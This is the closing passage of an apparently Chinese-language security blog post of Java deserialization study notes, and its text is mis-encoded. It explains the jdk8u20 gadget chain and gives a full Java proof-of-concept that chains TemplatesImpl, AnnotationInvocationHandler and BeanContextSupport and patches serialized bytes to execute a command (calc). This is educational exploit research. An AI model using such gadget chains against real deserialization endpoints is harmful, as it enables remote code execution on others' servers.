<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171728137.png" alt="image-20220217172834080"></p>
<p>å› æ­¤è¿™ä¸ª <code>this.equals(getBeanContextPeer())</code> æ¡ä»¶æ˜¯å¿…ç„¶æˆç«‹çš„ï¼Œè·Ÿè¿› <code>writeChildren</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171732030.png" alt="image-20220217173214858"></p>
<p>å¯è§æ˜¯å°†è‡ªèº«çš„ <code>children</code> å±æ€§éå†ä¸€éï¼Œå¦‚æœé”®åçš„å€¼æ˜¯å¯åºåˆ—åŒ–çš„åˆ™å°†é”®åçš„å€¼å’Œå¯¹åº”çš„å€¼é€šè¿‡ <code>writeObject</code> å†™å…¥åºåˆ—åŒ–æ•°æ®ä¸­ï¼ŒåŒæ—¶å†™å…¥çš„æ•°é‡å¿…é¡»å’Œ <code>serializable</code> å±æ€§çš„å€¼ç›¸ç­‰ï¼Œå¦åˆ™ä¼šå‡ºé”™ã€‚</p>
<p>æ­¤æ—¶é€šè¿‡è¿™ä¸ª <code>writeObject</code> çš„æ–¹å¼ï¼Œå¯çŸ¥å¦‚æœæƒ³åœ¨è¿›è¡Œ <code>readObject</code> æ—¶è®© <code>AnnotationInvocationHand</code> ç±»ç´§æ¥ç€ <code>HashSet</code> ç±»ï¼Œå°±å¾—å°† <code>AnnotationInvocationHand</code> ä½œä¸ºé”®åï¼Œè€Œ <code>HashSet</code> ä½œä¸ºå¯¹åº”çš„å€¼ã€‚</p>
<p>ä½†åˆå› ä¸º <code>serializable</code> å±æ€§åœ¨ <code>ååºåˆ—åŒ–</code> æ—¶çš„æœŸæœ›å€¼ä¸º <code>2</code> ï¼Œè€Œæ¯ä¸ªé”®å€¼å¯¹åªå¯¹åº” <code>1</code> çš„ <code>serializable</code> å€¼ï¼Œå¦åˆ™ä¼š <code>throw</code> å‡ºé”™è¯¯ï¼Œå¯¹æ­¤æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆğŸ‘‡</p>
<ul>
<li>ç”¨ <code>try</code> å¿½ç•¥è¿™ä¸ª <code>throw</code> å‡ºçš„é”™è¯¯</li>
<li>å†å‘ <code>children</code> å±æ€§åŠ å…¥ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå¹¶ç¡®ä¿è¿™ä¸ªå¤šåŠ çš„é”®å€¼å¯¹åœ¨ <code>AnnotationInvocationHand</code> =&gt; <code>HashSet</code> é”®å€¼å¯¹ä¹‹å(æˆ–æ˜¯å†å¦ç”Ÿæˆç¬¬äºŒä¸ª<code>AnnotationInvocationHand</code> =&gt; <code>HashSet</code> é”®å€¼å¯¹)</li>
</ul>
<p>ç›¸æ¯”ä¹‹ä¸‹è¿˜æ˜¯ç¬¬ä¸€ä¸ªæ–¹æ¡ˆè¾ƒä¸ºç®€å•äº›ã€‚</p>
<h3 id="payload-10"><a href="#payload-10" class="headerlink" title="- payload -"></a>- payload -</h3><p>æŒ‰ç…§ä¸Šé¢çš„åˆ†æï¼Œç†è®ºä¸Šåªéœ€è¦æ”¹ä¸€ä¸ªå­—èŠ‚ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.beans.beancontext.BeanContextSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk8u20</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class anClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor anCon = anClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        anCon.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// key(ä»»æ„é•¿åº¦0å­—èŠ‚éƒ½å¯)</span></span><br><span class="line">        String key = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="number">0</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap anMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        anMap.put(key, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ AnnotationInvocationHandlerä»£ç†</span></span><br><span class="line">        InvocationHandler anIn = (InvocationHandler) anCon.newInstance(Templates.class, anMap);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(anClass.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, anIn);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŒ…è£…(ç¡®ä¿templatesåœ¨proxyå‰é¢)</span></span><br><span class="line">        HashSet TriggerMap = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        TriggerMap.add(templates);</span><br><span class="line">        TriggerMap.add(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ BeanContextSupport</span></span><br><span class="line">        BeanContextSupport bean = <span class="keyword">new</span> BeanContextSupport();</span><br><span class="line"></span><br><span class="line">        HashMap beanMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        beanMap.put(anIn, TriggerMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;serializable&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(bean, <span class="string">&quot;children&quot;</span>, beanMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é¿å…æœ¬åœ°æ‰§è¡Œ</span></span><br><span class="line">        anMap.put(key, templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–å¤„ç†</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§„é¿ serializable != children.size çš„ throw</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oos.writeObject(bean);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ›¿æ¢ AnnotationInvocationHandler çš„ SC_SERIALIZABLE -&gt; SC_SERIALIZABLE | SC_WRITE_METHOD</span></span><br><span class="line">        <span class="comment">// å…¶ä¸­ 55CAF50F15CB7EA5 ä¸º AnnotationInvocationHandler çš„ serialVersionUID</span></span><br><span class="line">        <span class="keyword">byte</span>[] outBytes = HexBin.decode(HexBin.encode(barr.toByteArray()).replace(<span class="string">&quot;55CAF50F15CB7EA502&quot;</span>, <span class="string">&quot;55CAF50F15CB7EA503&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(outBytes));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171751642.png" alt="image-20220217175149441"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="- æ€»ç»“ -"></a>- æ€»ç»“ -</h2><p>é€šè¿‡è¿™å‡ å¤©çš„å­¦ä¹ ï¼Œå‘ç°åœ¨ <code>java</code> ä¸­çœŸæ˜¯æ¡æ¡é“è·¯é€šç½—é©¬ï¼Œæ¯æ¡é“¾éƒ½æœ‰ä¸å°‘çš„å…¶ä»–è¡ç”Ÿé“¾å¯ä»¥å€Ÿé‰´(å¤ªå·äº†ï¼Œ555 )ã€‚æ— è®ºå¦‚ä½•ï¼Œç»§ç»­å‘å‰å§ã€‚</p>


        <hr>
        <!-- Pager -->
        <ul class="pager">
          
          <li class="previous">
            <a href="/posts/82715091/" data-toggle="tooltip" data-placement="top" title="å­¦ä¹ ç¬”è®° - java-webå­¦ä¹ (ä¸€)">&larr; Previous Post</a>
          </li>
          
          
          <li class="next">
            <a href="/posts/2586386993/" data-toggle="tooltip" data-placement="top" title="æ€»ç»“ - ctfä¸­phpçš„phar(ä¸€)">Next Post &rarr;</a>
          </li>
          
        </ul>

        
        <!-- tip start -->
        <!-- tip -->
<!-- tip start -->
<div class="tip">
  <p>
    
      å¦‚æœæ‚¨å–œæ¬¢æ­¤åšå®¢æˆ–å‘ç°å®ƒå¯¹æ‚¨æœ‰ç”¨ï¼Œåˆ™æ¬¢è¿å¯¹æ­¤å‘è¡¨è¯„è®ºã€‚ä¹Ÿæ¬¢è¿æ‚¨å…±äº«æ­¤åšå®¢ï¼Œä»¥ä¾¿æ›´å¤šäººå¯ä»¥å‚ä¸ã€‚å¦‚æœåšå®¢ä¸­ä½¿ç”¨çš„å›¾åƒä¾µçŠ¯äº†æ‚¨çš„ç‰ˆæƒï¼Œè¯·ä¸ä½œè€…è”ç³»ä»¥å°†å…¶åˆ é™¤ã€‚è°¢è°¢ ï¼
    
  </p>
</div>
<!-- tip end -->

        <!-- tip end -->
        

        
        <!-- Sharing Srtart -->
        <!-- Social Social Share Post -->
<!-- Docs:https://github.com/overtrue/share.js -->

<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
  <ul class="list-inline text-center social-share-ul">
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-twitter">
        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a class="social-share-icon icon-wechat">
        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-weibo">
        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-qq">
        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon" href="mailto:?subject=å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€)&body=Hi,I found this website and thought you might like it https://morblog.cc/posts/320531414/">
        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
      </a>
    </li>
  </ul>
</div>

<!-- css & js -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

        <!-- Sharing End -->
        
        <hr>

        <!-- comments start -->
        <!-- 1. gitalk comment -->


<!-- 2. gitment comment -->


<!-- 4. disqus comment -->

  <!-- disqus comment start -->

  <div class="comment">
    <div id="disqus_thread" class="disqus-thread"></div>
  </div>

  <!-- disqus embedded js code start (one page only need to embed once) -->
  <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = "moryyds-1";
    var disqus_identifier = "https://morblog.cc/posts/320531414/";
    var disqus_url = "https://morblog.cc/posts/320531414/";

    (function () {
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <!-- disqus embedded js code start end -->

  <!-- disqus comment end -->


        <!-- comments end -->
        <hr>

      </div>

      <!-- Catalog: Tabe of Content -->
      <!-- Table of Contents -->

    
      <aside id="sidebar">
        <div id="toc" class="toc-article">
        <strong class="toc-title">ç›®å½•</strong>
        
          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">å­¦ä¹ ç¬”è®° - javaååºåˆ—åŒ–(ä¸€)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- å‰è¨€ -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E7%BD%AE%E5%86%85%E5%AE%B9"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- å‰ç½®å†…å®¹ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Transformer"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- Transformer -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- åˆ†æ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#InvokerTransformer"><span class="toc-nav-number">1.2.1.1.1.</span> <span class="toc-nav-text">- InvokerTransformer -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#ConstantTransformer"><span class="toc-nav-number">1.2.1.1.2.</span> <span class="toc-nav-text">- ConstantTransformer -</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#ChainedTransformer"><span class="toc-nav-number">1.2.1.1.3.</span> <span class="toc-nav-text">- ChainedTransformer -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#TemplatesImpl"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- TemplatesImpl -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-1"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CC%E9%93%BE"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- CCé“¾ -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC1"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">- CC1 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-nav-number">1.3.1.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-2"><span class="toc-nav-number">1.3.1.3.</span> <span class="toc-nav-text">- payload -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-nav-number">1.3.1.4.</span> <span class="toc-nav-text">- æ‰©å±• -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC2"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">- CC2 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-1"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-3"><span class="toc-nav-number">1.3.2.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC3"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">- CC3 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-2"><span class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-nav-number">1.3.3.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-4"><span class="toc-nav-number">1.3.3.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC4"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">- CC4 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-3"><span class="toc-nav-number">1.3.4.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-nav-number">1.3.4.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-5"><span class="toc-nav-number">1.3.4.3.</span> <span class="toc-nav-text">- payload -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%89%A9%E5%B1%95-1"><span class="toc-nav-number">1.3.4.4.</span> <span class="toc-nav-text">- æ‰©å±• -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC5"><span class="toc-nav-number">1.3.5.</span> <span class="toc-nav-text">- CC5 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-4"><span class="toc-nav-number">1.3.5.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-nav-number">1.3.5.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-6"><span class="toc-nav-number">1.3.5.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC6"><span class="toc-nav-number">1.3.6.</span> <span class="toc-nav-text">- CC6 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-5"><span class="toc-nav-number">1.3.6.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-7"><span class="toc-nav-number">1.3.6.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-7"><span class="toc-nav-number">1.3.6.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CC7"><span class="toc-nav-number">1.3.7.</span> <span class="toc-nav-text">- CC7 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-6"><span class="toc-nav-number">1.3.7.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-8"><span class="toc-nav-number">1.3.7.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload-8"><span class="toc-nav-number">1.3.7.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#jdk7u21"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">- jdk7u21 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-7"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-9"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#payload-9"><span class="toc-nav-number">1.4.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#jdk8u20"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">- jdk8u20 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84-8"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">- è°ƒç”¨ç»“æ„ -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90-10"><span class="toc-nav-number">1.5.2.</span> <span class="toc-nav-text">- åˆ†æ -</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#payload-10"><span class="toc-nav-number">1.5.3.</span> <span class="toc-nav-text">- payload -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">- æ€»ç»“ -</span></a></li></ol></li></ol>
        
        </div>
      </aside>
    



      <!-- Sidebar Container -->
      <div class="
                col-lg-8 col-lg-offset-1
                col-md-10 col-md-offset-1
                sidebar-container">

        <!-- Featured Tags -->
        
        <section>
          <!-- no hr -->
          <h5>
            <a href="/tags/">æ ‡ç­¾</a>
          </h5>
          <div class="tags">
            
            <a class="tag" href="/tags/#å®‰å…¨" title="å®‰å…¨">å®‰å…¨</a>
            
